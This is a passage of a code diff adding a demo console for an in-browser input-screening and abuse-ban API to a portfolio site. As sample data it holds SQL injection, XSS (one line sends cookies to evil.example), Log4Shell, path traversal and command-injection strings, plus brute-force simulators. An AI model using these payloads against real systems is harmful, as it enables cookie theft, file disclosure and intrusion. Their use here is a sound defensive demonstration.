@@ -15,9 +15,15 @@
       --line: rgba(142, 215, 255, 0.18);
       --background: #030711;
       --grid: rgba(83, 246, 255, 0.035);
+      --ok: #a7ff6a;
+      --warn: #ffcf5a;
+      --bad: #ff6b6b;
     }
 
     [data-theme="light"] {
+      --ok: #2a7d12;
+      --warn: #9a6a00;
+      --bad: #c0282d;
       --ink: #102238;
       --muted: #50677d;
       --surface: rgba(255, 255, 255, 0.72);
@@ -187,6 +193,84 @@
     .api-note { padding: 22px; border-left: 2px solid var(--pink); background: rgba(255, 79, 216, 0.06); color: var(--muted); }
     .api-note strong { display: block; margin-bottom: 8px; color: var(--pink); }
 
+    /* ── Xeno Shield API console ── */
+    .api-lede { max-width: 720px; margin: -10px 0 24px; color: var(--muted); font-size: 1.02rem; }
+    .api-lede code, .recipe-hint code { color: var(--cyan); font-family: Consolas, "Courier New", monospace; font-size: 0.9em; }
+    .api-badges { display: flex; flex-wrap: wrap; gap: 8px; margin: 0 0 30px; padding: 0; list-style: none; }
+    .api-badges li { padding: 4px 10px; border: 1px solid var(--line); color: var(--muted); font-size: 0.72rem; letter-spacing: 0.04em; background: var(--surface); }
+    .api-badges b { color: var(--cyan); font-weight: 700; }
+
+    .recipes { margin: 0 0 18px; }
+    .recipe-group { display: flex; flex-wrap: wrap; align-items: center; gap: 6px; margin-bottom: 8px; }
+    .recipe-group > span { min-width: 74px; color: var(--pink); font-size: 0.68rem; font-weight: 700; letter-spacing: 0.14em; text-transform: uppercase; }
+    .chip { padding: 5px 10px; border: 1px solid var(--line); color: var(--ink); background: var(--surface); font: inherit; font-size: 0.76rem; cursor: pointer; transition: border-color 150ms ease, color 150ms ease; }
+    .chip:hover, .chip:focus-visible { border-color: var(--cyan); color: var(--cyan); }
+    .chip.bad:hover, .chip.bad:focus-visible { border-color: var(--pink); color: var(--pink); }
+    .recipe-hint { margin: 6px 0 0; color: var(--muted); font-size: 0.78rem; }
+
+    .console { display: grid; grid-template-columns: minmax(0, 1fr) minmax(0, 1fr); gap: 14px; align-items: stretch; }
+    .panel { min-width: 0; border: 1px solid var(--line); background: var(--surface); }
+    .panel-head { display: flex; align-items: center; justify-content: space-between; gap: 12px; padding: 10px 14px; border-bottom: 1px solid var(--line); color: var(--muted); font-size: 0.72rem; letter-spacing: 0.14em; text-transform: uppercase; }
+    .panel-body { padding: 14px; }
+    .req-line { display: grid; grid-template-columns: auto minmax(0, 1fr) auto; gap: 8px; }
+    .field, .req-line select { width: 100%; padding: 9px 10px; border: 1px solid var(--line); border-radius: 0; color: var(--ink); background: rgba(3, 7, 17, 0.35); font: inherit; font-family: Consolas, "Courier New", monospace; font-size: 0.82rem; }
+    [data-theme="light"] .field, [data-theme="light"] .req-line select { background: rgba(255, 255, 255, 0.7); }
+    .field:focus, .req-line select:focus { outline: none; border-color: var(--cyan); box-shadow: 0 0 0 1px var(--cyan); }
+    textarea.field { display: block; resize: vertical; min-height: 84px; line-height: 1.5; white-space: pre; overflow: auto; }
+    .field-label { display: flex; justify-content: space-between; margin: 14px 0 6px; color: var(--muted); font-size: 0.7rem; letter-spacing: 0.12em; text-transform: uppercase; }
+    .send { padding: 9px 20px; border: 1px solid var(--cyan); color: var(--cyan); background: transparent; font: inherit; font-size: 0.8rem; font-weight: 700; letter-spacing: 0.12em; text-transform: uppercase; cursor: pointer; transition: background 160ms ease, color 160ms ease; }
+    .send:hover, .send:focus-visible { background: var(--cyan); color: #041019; }
+    .send[disabled] { opacity: 0.5; cursor: progress; }
+    .vars { display: flex; flex-wrap: wrap; gap: 6px 16px; margin-top: 14px; color: var(--muted); font-size: 0.74rem; font-family: Consolas, "Courier New", monospace; }
+    .vars b { color: var(--pink); font-weight: 400; }
+    .vars span span { color: var(--ink); }
+
+    .status-line { display: flex; flex-wrap: wrap; align-items: center; gap: 6px 12px; min-height: 22px; }
+    .pill { padding: 2px 9px; border: 1px solid currentColor; font-size: 0.78rem; font-weight: 700; font-family: Consolas, "Courier New", monospace; }
+    .pill.s2 { color: var(--ok); } .pill.s3 { color: var(--cyan); } .pill.s4 { color: var(--warn); } .pill.s5 { color: var(--bad); }
+    .meta { color: var(--muted); font-size: 0.76rem; font-family: Consolas, "Courier New", monospace; letter-spacing: 0; text-transform: none; }
+    .tabs { display: flex; gap: 2px; margin-bottom: 10px; }
+    .tab { padding: 5px 12px; border: 0; border-bottom: 2px solid transparent; color: var(--muted); background: transparent; font: inherit; font-size: 0.75rem; letter-spacing: 0.1em; text-transform: uppercase; cursor: pointer; }
+    .tab[aria-selected="true"] { color: var(--cyan); border-color: var(--cyan); }
+    .out { max-height: 440px; min-height: 260px; margin: 0; overflow: auto; color: var(--ink); font-family: Consolas, "Courier New", monospace; font-size: 0.78rem; line-height: 1.55; white-space: pre-wrap; word-break: break-word; }
+    .out .j-key { color: var(--cyan); } .out .j-str { color: var(--ok); } .out .j-num { color: var(--warn); } .out .j-kw { color: var(--pink); }
+    .out .h-name { color: var(--cyan); } .out .dim { color: var(--muted); }
+
+    .lower { display: grid; grid-template-columns: minmax(0, 1.7fr) minmax(0, 1fr); gap: 14px; margin-top: 14px; }
+    .reg-wrap { overflow-x: auto; }
+    table.registry { width: 100%; border-collapse: collapse; font-size: 0.8rem; }
+    .registry th { padding: 8px 12px; color: var(--muted); font-size: 0.66rem; font-weight: 400; letter-spacing: 0.14em; text-align: left; text-transform: uppercase; white-space: nowrap; }
+    .registry td { padding: 9px 12px; border-top: 1px solid var(--line); white-space: nowrap; }
+    .registry tbody tr { cursor: pointer; transition: background 150ms ease; }
+    .registry tbody tr:hover, .registry tbody tr:focus-visible { background: rgba(83, 246, 255, 0.07); outline: none; }
+    .registry tr.is-selected td:first-child { box-shadow: inset 2px 0 var(--pink); }
+    .registry tr.flash { animation: row-flash 1.4s ease-out; }
+    .registry tr.is-deleted td { opacity: 0.45; text-decoration: line-through; }
+    .registry .name { font-weight: 700; } .registry .sub { display: block; color: var(--muted); font-size: 0.7rem; font-family: Consolas, "Courier New", monospace; }
+    .badge { padding: 1px 8px; border: 1px solid currentColor; font-size: 0.68rem; letter-spacing: 0.06em; text-transform: uppercase; }
+    .badge.none { color: var(--muted); } .badge.low { color: var(--cyan); } .badge.medium { color: var(--warn); } .badge.high { color: var(--pink); } .badge.critical { color: var(--bad); box-shadow: 0 0 8px rgba(255, 107, 107, 0.35); }
+    .badge.quarantined { color: var(--warn); } .badge.released { color: var(--ok); } .badge.confirmed { color: var(--bad); }
+    .badge.active, .badge.permanent { color: var(--bad); } .badge.expired, .badge.lifted { color: var(--muted); }
+    .registry td .sub { margin-top: 2px; } .registry td.wide { max-width: 340px; overflow: hidden; text-overflow: ellipsis; }
+    .registry .payload { overflow: hidden; text-overflow: ellipsis; font-family: Consolas, "Courier New", monospace; font-size: 0.78rem; font-weight: 400; }
+    .stack { display: grid; gap: 14px; align-content: start; min-width: 0; }
+    .stack .registry th, .stack .registry td { padding-left: 9px; padding-right: 9px; }
+    .stack .registry td:first-child { max-width: 190px; overflow: hidden; text-overflow: ellipsis; }
+    .chip.sim { border-color: var(--pink); color: var(--pink); } .chip.sim:hover, .chip.sim:focus-visible { background: rgba(255, 79, 216, 0.12); }
+    .pips { display: inline-flex; gap: 3px; vertical-align: middle; }
+    .pips i { width: 7px; height: 12px; border: 1px solid var(--line); }
+    .pips i.on { background: var(--pink); border-color: var(--pink); box-shadow: 0 0 6px rgba(255, 79, 216, 0.5); }
+    .tools { display: flex; flex-wrap: wrap; align-items: center; gap: 10px; }
+    .tools label { display: inline-flex; align-items: center; gap: 6px; color: var(--muted); font-size: 0.72rem; letter-spacing: 0; text-transform: none; cursor: pointer; }
+    .log { margin: 0; padding: 0; list-style: none; font-family: Consolas, "Courier New", monospace; font-size: 0.74rem; }
+    .log li { display: grid; grid-template-columns: 40px 54px minmax(0, 1fr); gap: 8px; padding: 6px 14px; border-top: 1px solid var(--line); }
+    .log li:first-child { border-top: 0; }
+    .log .m { color: var(--muted); } .log .p { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+    .log .c2 { color: var(--ok); } .log .c3 { color: var(--cyan); } .log .c4 { color: var(--warn); } .log .c5 { color: var(--bad); }
+    .empty { padding: 18px 14px; color: var(--muted); font-size: 0.82rem; }
+
+    @keyframes row-flash { 0% { background: rgba(255, 79, 216, 0.28); } 100% { background: transparent; } }
+
     footer { display: flex; justify-content: space-between; gap: 20px; padding: 32px 0 42px; color: var(--muted); font-size: 0.85rem; }
     .footer-links { display: flex; flex-wrap: wrap; gap: 18px; }
     footer a { color: var(--cyan); }
@@ -205,7 +289,10 @@
       .hero { min-height: 70vh; padding: 50px 0 80px; }
       .hero-layout { grid-template-columns: 1fr; gap: 20px; }
       .laptop-scene { width: min(300px, 100%); margin: 0 auto; }
-      .project-grid, .service-grid, .about-layout { grid-template-columns: 1fr; }
+      .project-grid, .service-grid, .about-layout, .console, .lower { grid-template-columns: 1fr; }
+      .req-line { grid-template-columns: auto minmax(0, 1fr); }
+      .req-line .send { grid-column: 1 / -1; }
+      .recipe-group > span { min-width: 100%; }
       .project { min-height: 170px; }
       .project h3 { margin-top: 28px; }
       .service { min-height: 190px; }
@@ -226,6 +313,7 @@
       <nav aria-label="Main navigation">
         <a href="#work">Work</a>
         <a href="#services">What we do</a>
+        <a href="#api">API</a>
         <a href="#about">About</a>
         <a href="#contact">Contact</a>
       </nav>
@@ -270,6 +358,79 @@
         </div>
       </section>
 
+      <section id="api" aria-labelledby="api-title">
+        <p class="section-label">Live API / attack it yourself</p>
+        <h2 id="api-title">Xeno Shield API.</h2>
+        <p class="api-lede">A defensive API for websites and apps. It does two jobs: <strong>quarantine bad data</strong> before it reaches your database (SQL injection, XSS, path traversal, log4shell, obfuscated payloads, even encoded evasions), and <strong>stop abuse</strong> before it reaches your users (brute force, credential stuffing, password spraying, distributed attacks) with bans that escalate on repeat offenders. It runs entirely in your browser and speaks real HTTP semantics. Fire the recipes, launch a simulated attack, edit anything, or open devtools and call <code>xeno.fetch('/v1/quarantine')</code>.</p>
+        <ul class="api-badges" aria-label="API features">
+          <li><b>8</b> detector families</li>
+          <li><b>Evasion-proof</b> (URL-decode, Unicode)</li>
+          <li>Reviewer <b>state machine</b></li>
+          <li><b>Brute force</b> + stuffing + spray</li>
+          <li><b>Escalating</b> bans</li>
+          <li>Tunable <b>policies</b></li>
+          <li><b>ETag</b> + If-Match</li>
+          <li><b>RFC 9457</b> errors</li>
+          <li><b>Idempotency-Key</b></li>
+          <li><b>Keyset</b> pagination</li>
+        </ul>
+
+        <div class="recipes" id="recipes" aria-label="Request recipes"></div>
+
+        <div class="console">
+          <div class="panel">
+            <div class="panel-head"><span>Request</span><span class="meta">Ctrl + Enter to send</span></div>
+            <div class="panel-body">
+              <div class="req-line">
+                <select id="req-method" aria-label="HTTP method"><option>GET</option><option>POST</option><option>PUT</option><option>PATCH</option><option>DELETE</option><option>HEAD</option><option>OPTIONS</option></select>
+                <input class="field" id="req-path" type="text" spellcheck="false" autocomplete="off" aria-label="Request path" value="/v1/quarantine" />
+                <button class="send" id="req-send" type="button">Send</button>
+              </div>
+              <label class="field-label" for="req-headers"><span>Headers</span></label>
+              <textarea class="field" id="req-headers" rows="4" spellcheck="false" aria-label="Request headers"></textarea>
+              <label class="field-label" for="req-body"><span>Body (JSON)</span></label>
+              <textarea class="field" id="req-body" rows="9" spellcheck="false" aria-label="Request body"></textarea>
+              <div class="vars" id="vars" aria-live="polite"></div>
+            </div>
+          </div>
+
+          <div class="panel">
+            <div class="panel-head"><div class="status-line" id="res-status"><span class="meta">Awaiting transmission…</span></div></div>
+            <div class="panel-body">
+              <div class="tabs" role="tablist" aria-label="Response views">
+                <button class="tab" role="tab" aria-selected="true" data-tab="body">Body</button>
+                <button class="tab" role="tab" aria-selected="false" data-tab="headers">Headers</button>
+                <button class="tab" role="tab" aria-selected="false" data-tab="code">fetch()</button>
+              </div>
+              <pre class="out" id="res-out" tabindex="0" aria-live="polite"></pre>
+            </div>
+          </div>
+        </div>
+
+        <div class="lower">
+          <div class="panel">
+            <div class="panel-head">
+              <span>Quarantine</span>
+              <div class="tools">
+                <label><input type="checkbox" id="show-deleted" /> show deleted</label>
+                <button class="chip bad" id="reset-sandbox" type="button">Reset sandbox</button>
+              </div>
+            </div>
+            <div class="reg-wrap"><table class="registry"><thead><tr><th>Captured data</th><th>Threat</th><th>Review</th><th>Hits</th></tr></thead><tbody id="quarantine-body"></tbody></table></div>
+          </div>
+          <div class="stack">
+            <div class="panel">
+              <div class="panel-head"><span>Bans</span><span class="meta" id="ban-meta"></span></div>
+              <div class="reg-wrap"><table class="registry"><thead><tr><th>Subject</th><th>State</th><th>Blocked</th></tr></thead><tbody id="bans-body"></tbody></table></div>
+            </div>
+            <div class="panel">
+              <div class="panel-head"><span>Traffic</span><span class="meta" id="rate-meta"></span></div>
+              <ul class="log" id="log"><li class="empty">No traffic yet.</li></ul>
+            </div>
+          </div>
+        </div>
+      </section>
+
       <section id="about" aria-labelledby="about-title">
         <div class="about-layout">
           <div>
@@ -278,7 +439,7 @@
           </div>
           <div>
             <p>I'm Jonathan Adewale, a developer and creative thinker focused on making the web more useful, expressive, and human.</p>
-            <div class="api-note" style="margin-top: 28px;"><strong>API-ready</strong><span id="api-status">MY dynamic content can connect here when I'M  ready.</span></div>
+            <div class="api-note" style="margin-top: 28px;"><strong>API online</strong><span id="api-status">Connecting to the Xeno Shield…</span> <a href="#api" style="color: var(--cyan);">Test it →</a></div>
           </div>
         </div>
       </section>
@@ -295,8 +456,8 @@
     </footer>
   </div>
 
+  <script src="xeno-api.js"></script>
   <script>
-    const API_URL = "";
     const RESUME_PIN = "1059";
     const themeToggle = document.querySelector("#theme-toggle");
     const themeLabel = themeToggle.querySelector(".theme-label");
@@ -320,17 +481,414 @@
       return false;
     }
 
-    async function loadApiContent() {
-      if (!API_URL) return;
-      const response = await fetch(API_URL);
-      if (!response.ok) throw new Error("API request failed");
-      const data = await response.json();
-      document.querySelector("#api-status").textContent = data.message || "API connected.";
-    }
+    /* ───────────── Xeno Shield API console ───────────── */
+    (function () {
+      const $ = (s) => document.querySelector(s);
+      const api = window.xeno;
+      const statusEl = $("#api-status");
+      if (!api) { statusEl.textContent = "The API engine failed to load (xeno-api.js)."; return; }
 
-    loadApiContent().catch(() => {
-      document.querySelector("#api-status").textContent = "API connection is ready to be configured.";
-    });
+      const esc = (s) => String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
+      const j = (o) => JSON.stringify(o, null, 2);
+      const AUTH = "Authorization: Bearer " + XenoAPI.demoToken;
+      const ctx = { caseId: "", caseEtag: "", banId: "", banEtag: "", polEtag: "", cursor: "", idem: "demo-" + Math.random().toString(36).slice(2, 10) };
+      let last = null;
+      let tab = "body";
+      let booted = false;
+      const seen = new Map();
+      const logItems = [];
+
+      const ATTACKS = {
+        username: "admin' OR '1'='1' --",
+        // the angle brackets are written as \u003c so this payload cannot end the surrounding inline block early
+        comment: "\u003cscript>fetch('//evil.example/?c='+document.cookie)\u003c/script>",
+        file: "../../../../etc/passwd",
+        search: "${jndi:ldap://203.0.113.9/a}",
+        bio: "x'; DROP TABLE users;--",
+        redirect: "https://shop.example/?next=javascript:alert(1)",
+        filename: "report.pdf; cat /etc/passwd",
+        json: '{"__proto__":{"isAdmin":true}}',
+        q: "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
+        name: "Ada Lovelace"
+      };
+
+      const MERGE = "Content-Type: application/merge-patch+json";
+      const attemptBody = { scope: "login", ip: "198.51.100.7", identity: "admin", outcome: "failure", secret_fingerprint: "pw_hunter2xx" };
+
+      const RECIPES = [
+        { group: "Screen data", items: [
+          { label: "Clean form", method: "POST", path: "/v1/inspections", headers: [AUTH], body: j({ source: "contact-form", fields: { name: "Ada Lovelace", email: "ada@example.com", message: "Loved the demo, can we talk?" } }) },
+          { label: "SQL injection", method: "POST", path: "/v1/inspections", headers: [AUTH], body: j({ source: "login-form", fields: { username: "' UNION SELECT username, password FROM users --", password: "whatever" } }) },
+          { label: "XSS comment", method: "POST", path: "/v1/inspections", headers: [AUTH], body: j({ source: "comment-box", fields: { body: "<img src=x onerror=alert(document.cookie)>" } }) },
+          { label: "Encoded evasion", method: "POST", path: "/v1/inspections", headers: [AUTH], body: j({ source: "search", fields: { q: "%253Cscript%253Ealert(1)%253C%252Fscript%253E" } }) },
+          { label: "Log4Shell", method: "POST", path: "/v1/inspections", headers: [AUTH], body: j({ source: "search", fields: { q: "${jndi:ldap://203.0.113.9/a}" } }) },
+          { label: "10-field barrage", method: "POST", path: "/v1/inspections", headers: [AUTH], body: j({ source: "barrage", fields: ATTACKS }) },
+          { label: "Dry run (monitor)", method: "POST", path: "/v1/inspections", headers: [AUTH], body: j({ source: "dry-run", mode: "monitor", payload: "../../../../etc/shadow" }) }
+        ] },
+        { group: "Quarantine", items: [
+          { label: "List", method: "GET", path: "/v1/quarantine" },
+          { label: "High + critical", method: "GET", path: "/v1/quarantine?severity=high,critical&status=quarantined&sort=-score&fields=source,payload,severity,score" },
+          { label: "Search", method: "GET", path: "/v1/quarantine?q=script" },
+          { label: "Page 1 (limit 3)", method: "GET", path: "/v1/quarantine?limit=3&sort=-score,source" },
+          { label: "Next page", method: "GET", path: "/v1/quarantine?limit=3&sort=-score,source&cursor={{cursor}}" },
+          { label: "Get one", method: "GET", path: "/v1/quarantine/{{case}}" },
+          { label: "Conditional GET → 304", method: "GET", path: "/v1/quarantine/{{case}}", headers: ["If-None-Match: {{caseetag}}"] },
+          { label: "History", method: "GET", path: "/v1/quarantine/{{case}}/history" },
+          { label: "Confirm malicious", method: "PATCH", path: "/v1/quarantine/{{case}}", headers: [AUTH, "If-Match: {{caseetag}}", MERGE], body: j({ status: "confirmed", labels: ["attack"], reviewer_note: "Verified by hand." }) },
+          { label: "Release (false positive)", method: "PATCH", path: "/v1/quarantine/{{case}}", headers: [AUTH, "If-Match: {{caseetag}}", MERGE], body: j({ status: "released", reviewer_note: "False positive: legitimate user input." }) },
+          { label: "Add manually", method: "POST", path: "/v1/quarantine", headers: [AUTH], body: j({ source: "support-inbox", field: "subject", payload: "URGENT!!! click http://free-gift.example now", labels: ["phishing"] }) },
+          { label: "Delete", method: "DELETE", path: "/v1/quarantine/{{case}}", headers: [AUTH, "If-Match: {{caseetag}}"] },
+          { label: "Restore", method: "POST", path: "/v1/quarantine/{{case}}/restore", headers: [AUTH] }
+        ] },
+        { group: "Abuse guard", items: [
+          { label: "Failed login", method: "POST", path: "/v1/guard/attempts", headers: [AUTH], body: j(attemptBody) },
+          { label: "Successful login", method: "POST", path: "/v1/guard/attempts", headers: [AUTH], body: j({ ...attemptBody, outcome: "success" }) },
+          { label: "Is this subject blocked?", method: "GET", path: "/v1/guard/status?scope=login&ip=198.51.100.7&identity=admin" },
+          { label: "Brute-force one account", sim: "brute" },
+          { label: "Credential stuffing", sim: "stuffing" },
+          { label: "Password spraying", sim: "spray" },
+          { label: "Distributed attack", sim: "distributed" }
+        ] },
+        { group: "Bans + policy", items: [
+          { label: "Active bans", method: "GET", path: "/v1/bans?active=true&sort=-created_at" },
+          { label: "Get ban", method: "GET", path: "/v1/bans/{{ban}}" },
+          { label: "Ban an IP", method: "POST", path: "/v1/bans", headers: [AUTH, "Idempotency-Key: {{idem}}"], body: j({ kind: "ip", value: "192.0.2.77", scope: "signup", reason: "Fake-account farm", duration_seconds: 900 }) },
+          { label: "Extend ban", method: "PATCH", path: "/v1/bans/{{ban}}", headers: [AUTH, "If-Match: {{banetag}}", MERGE], body: j({ duration_seconds: 86400 }) },
+          { label: "Lift ban", method: "DELETE", path: "/v1/bans/{{ban}}", headers: [AUTH, "If-Match: {{banetag}}"] },
+          { label: "Re-apply ban", method: "POST", path: "/v1/bans/{{ban}}/restore", headers: [AUTH] },
+          { label: "Login policy", method: "GET", path: "/v1/policies/login" },
+          { label: "Tighten login (3 tries)", method: "PATCH", path: "/v1/policies/login", headers: [AUTH, "If-Match: {{poletag}}", MERGE], body: j({ max_failures: 3, window_seconds: 120 }) },
+          { label: "Stats", method: "GET", path: "/v1/stats" }
+        ] },
+        { group: "Break it", bad: true, items: [
+          { label: "422 bad inspection", method: "POST", path: "/v1/inspections", headers: [AUTH], body: j({ source: "x", fields: { a: 1 }, payload: "both", mode: "yolo" }) },
+          { label: "401 no token", method: "POST", path: "/v1/inspections", headers: [], body: j({ source: "app", payload: "hello" }) },
+          { label: "415 wrong type", method: "POST", path: "/v1/inspections", headers: [AUTH, "Content-Type: text/plain"], body: j({ source: "app", payload: "hello" }) },
+          { label: "428 no If-Match", method: "PATCH", path: "/v1/quarantine/{{case}}", headers: [AUTH, MERGE], body: '{ "status": "released" }' },
+          { label: "412 stale ETag", method: "PATCH", path: "/v1/quarantine/{{case}}", headers: [AUTH, 'If-Match: "1-deadbeef"', MERGE], body: '{ "labels": ["x"] }' },
+          { label: "422 evidence is immutable", method: "PATCH", path: "/v1/quarantine/{{case}}", headers: [AUTH, "If-Match: *", MERGE], body: '{ "payload": "nothing to see here" }' },
+          { label: "409 illegal transition", method: "PATCH", path: "/v1/quarantine/qr_seed_bobby", headers: [AUTH, "If-Match: *", MERGE], body: '{ "status": "released" }' },
+          { label: "422 critical needs a note", method: "PATCH", path: "/v1/quarantine/qr_seed_jndi", headers: [AUTH, "If-Match: *", MERGE], body: '{ "status": "released" }' },
+          { label: "403 banned attacker", method: "POST", path: "/v1/guard/attempts", headers: [AUTH], body: j({ scope: "login", ip: "203.0.113.50", identity: "root" }) },
+          { label: "409 duplicate ban", method: "POST", path: "/v1/bans", headers: [AUTH], body: j({ kind: "ip", value: "203.0.113.50", scope: "login", reason: "Already banned" }) },
+          { label: "429 flood the API ×80", run: "flood" }
+        ] }
+      ];
+
+      /* ── attack simulators: sequences of real API calls ── */
+      const rnd = () => 100 + Math.floor(Math.random() * 140);
+      const attempt = (o) => ({ scope: "login", outcome: "failure", ...o });
+      const SIMS = {
+        brute: { title: "Brute force: 8 password guesses against one account from one IP", steps() {
+          const ip = "203.0.113." + rnd();
+          return Array.from({ length: 8 }, (_, i) => attempt({ ip, identity: "admin", secret_fingerprint: "guess_" + i + "_xyz" }));
+        } },
+        stuffing: { title: "Credential stuffing: one IP replaying 8 leaked email/password pairs", steps() {
+          const ip = "203.0.113." + rnd();
+          return Array.from({ length: 8 }, (_, i) => attempt({ ip, identity: "leak" + i + "@mail.example", secret_fingerprint: "leaked_" + i + "_abc" }));
+        } },
+        spray: { title: "Password spraying: one common password, 7 accounts, 7 different IPs", steps() {
+          const fp = "pw_summer2026_" + Math.random().toString(36).slice(2, 6);
+          return Array.from({ length: 7 }, (_, i) => attempt({ ip: "203.0.113." + (rnd() + i * 0), identity: "employee" + i, secret_fingerprint: fp }));
+        } },
+        distributed: { title: "Distributed attack: 8 different IPs all hammering one account", steps() {
+          const who = "ceo-" + Math.random().toString(36).slice(2, 5);
+          return Array.from({ length: 8 }, (_, i) => attempt({ ip: "192.0.2." + (rnd() + i), identity: who }));
+        } }
+      };
+
+      /* ── helpers ── */
+      const fill = (text) => String(text)
+        .replace(/\{\{case\}\}/g, ctx.caseId || "qr_seed_xss")
+        .replace(/\{\{caseetag\}\}/g, ctx.caseEtag || "*")
+        .replace(/\{\{ban\}\}/g, ctx.banId || "ban_seed_scanner")
+        .replace(/\{\{banetag\}\}/g, ctx.banEtag || "*")
+        .replace(/\{\{poletag\}\}/g, ctx.polEtag || "*")
+        .replace(/\{\{cursor\}\}/g, ctx.cursor)
+        .replace(/\{\{idem\}\}/g, ctx.idem);
+
+      function highlight(json) {
+        return json.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/("(?:\\.|[^"\\])*")(\s*:)?|\b(true|false|null)\b|-?\d+(?:\.\d+)?(?:[eE][+-]?\d+)?/g, (m, s, colon, kw) => {
+          if (s) return colon ? '<span class="j-key">' + s + "</span>" + colon : '<span class="j-str">' + s + "</span>";
+          if (kw) return '<span class="j-kw">' + m + "</span>";
+          return '<span class="j-num">' + m + "</span>";
+        });
+      }
+
+      function parseHeaders(text) {
+        const out = {};
+        for (const raw of text.split("\n")) {
+          const line = raw.trim();
+          if (!line || line.startsWith("#")) continue;
+          const i = line.indexOf(":");
+          if (i < 1) throw new Error('Bad header line: "' + line + '"');
+          out[line.slice(0, i).trim()] = line.slice(i + 1).trim();
+        }
+        return out;
+      }
+
+      /* ── form ── */
+      const el = { method: $("#req-method"), path: $("#req-path"), headers: $("#req-headers"), body: $("#req-body"), send: $("#req-send") };
+
+      function load(r) {
+        el.method.value = r.method;
+        el.path.value = fill(r.path);
+        el.headers.value = (r.headers || []).map(fill).join("\n");
+        el.body.value = r.body ? fill(r.body) : "";
+      }
+
+      function renderVars() {
+        const v = (k, val) => "<span><b>" + k + "</b> <span>" + esc(val || "—") + "</span></span>";
+        $("#vars").innerHTML = v("{{case}}", ctx.caseId) + v("{{caseetag}}", ctx.caseEtag) + v("{{ban}}", ctx.banId) + v("{{cursor}}", ctx.cursor ? ctx.cursor.slice(0, 12) + "…" : "");
+      }
+
+      function renderRecipes() {
+        const root = $("#recipes");
+        root.innerHTML = "";
+        RECIPES.forEach((g) => {
+          const row = document.createElement("div");
+          row.className = "recipe-group";
+          row.innerHTML = "<span>" + g.group + "</span>";
+          g.items.forEach((r) => {
+            const b = document.createElement("button");
+            b.type = "button";
+            b.className = "chip" + (g.bad ? " bad" : "") + (r.sim ? " sim" : "");
+            b.textContent = r.label;
+            b.addEventListener("click", () => {
+              if (r.sim) return simulate(r.sim);
+              if (r.run === "flood") return flood();
+              load(r);
+              if (r.method === "GET") send(); else el.send.focus();
+            });
+            row.appendChild(b);
+          });
+          root.appendChild(row);
+        });
+        const hint = document.createElement("p");
+        hint.className = "recipe-hint";
+        hint.innerHTML = "Reads fire instantly; writes load into the form so you can edit them first. <b>Simulations</b> (pink-outlined) fire a whole attack sequence at the guard. <code>{{case}}</code>, <code>{{ban}}</code> and the ETags follow whatever you touched last, so recipes chain: screen, review, confirm, delete, restore.";
+        root.appendChild(hint);
+      }
+
+      /* ── rendering a response ── */
+      function renderResponse() {
+        if (!last) return;
+        const r = last;
+        const cls = "s" + String(r.status)[0];
+        $("#res-status").innerHTML = '<span class="pill ' + cls + '">' + r.status + " " + esc(r.statusText) + '</span><span class="meta">' + r.ms + " ms · " + r.size + " B</span>" + (r.note ? '<span class="meta">' + esc(r.note) + "</span>" : "");
+        const out = $("#res-out");
+        document.querySelectorAll(".tab").forEach((t) => t.setAttribute("aria-selected", String(t.dataset.tab === tab)));
+        if (tab === "headers") {
+          out.innerHTML = r.headers.map(([k, v]) => '<span class="h-name">' + esc(k) + "</span>: " + esc(v)).join("\n");
+        } else if (tab === "code") {
+          out.textContent = r.snippet;
+        } else if (!r.text) {
+          out.innerHTML = '<span class="dim">(no body — ' + r.status + " " + esc(r.statusText) + ")</span>";
+        } else {
+          try { out.innerHTML = highlight(JSON.stringify(JSON.parse(r.text), null, 2)); } catch (e) { out.textContent = r.text; }
+        }
+      }
+
+      function snippetFor(method, path, headers, body) {
+        const hs = Object.keys(headers).length ? "  headers: " + JSON.stringify(headers, null, 4).replace(/\n/g, "\n  ") + ",\n" : "";
+        let bs = "";
+        if (body) {
+          try { bs = "  body: JSON.stringify(" + JSON.stringify(JSON.parse(body), null, 2).replace(/\n/g, "\n  ") + "),\n"; } catch (e) { bs = "  body: " + JSON.stringify(body) + ",\n"; }
+        }
+        return "// paste into your devtools console on this page\nconst res = await xeno.fetch(" + JSON.stringify(path) + ", {\n  method: " + JSON.stringify(method) + ",\n" + hs + bs + "});\nconsole.log(res.status, res.headers.get('etag'));\nconsole.log(res.status === 204 || res.status === 304 ? null : await res.json());";
+      }
+
+      function track(status, method, path) {
+        logItems.unshift({ status, method, path });
+        logItems.length = Math.min(logItems.length, 12);
+        $("#log").innerHTML = logItems.map((l) => '<li><span class="m">' + esc(l.method) + '</span><span class="c' + String(l.status)[0] + '">' + l.status + '</span><span class="p" title="' + esc(l.path) + '">' + esc(l.path) + "</span></li>").join("");
+      }
+
+      /** Learn ids/etags/cursors from whatever just came back, so recipes chain. */
+      function absorb(res, text, path) {
+        const etag = res.headers.get("etag");
+        const loc = res.headers.get("location");
+        let data = null;
+        try { data = text ? JSON.parse(text) : null; } catch (e) { /* not json */ }
+        const isCase = /\/v1\/quarantine\/[^/?]+/.exec(path);
+        const isBan = /\/v1\/bans\/[^/?]+/.exec(path);
+        if (data && data.object === "quarantine_case") ctx.caseId = data.id;
+        else if (loc && /quarantine/.test(loc)) ctx.caseId = loc.split("/").pop();
+        else if (isCase && res.status < 400 && !/history$/.test(path)) ctx.caseId = isCase[0].split("/")[3];
+        if (data && data.object === "ban") ctx.banId = data.id;
+        else if (isBan && res.status < 400 && !/history$/.test(path)) ctx.banId = isBan[0].split("/")[3];
+        if (data && data.ban && data.ban.id) ctx.banId = data.ban.id;
+        if (data && Array.isArray(data.results)) { const c = data.results.map((r) => r.case_id).filter(Boolean).pop(); if (c) ctx.caseId = c; }
+        if (etag && res.ok) {
+          if (/\/v1\/quarantine\/[^/]+$/.test(path.split("?")[0])) ctx.caseEtag = etag;
+          else if (/\/v1\/bans\/[^/]+$/.test(path.split("?")[0])) ctx.banEtag = etag;
+          else if (/\/v1\/policies\/[^/]+$/.test(path.split("?")[0])) ctx.polEtag = etag;
+        }
+        if (data && data.page && data.page.next_cursor) ctx.cursor = data.page.next_cursor;
+        const rem = res.headers.get("ratelimit-remaining");
+        if (rem !== null) $("#rate-meta").textContent = "API tokens " + rem + "/" + res.headers.get("ratelimit-limit");
+      }
+
+      /* ── sending ── */
+      async function send() {
+        const method = el.method.value;
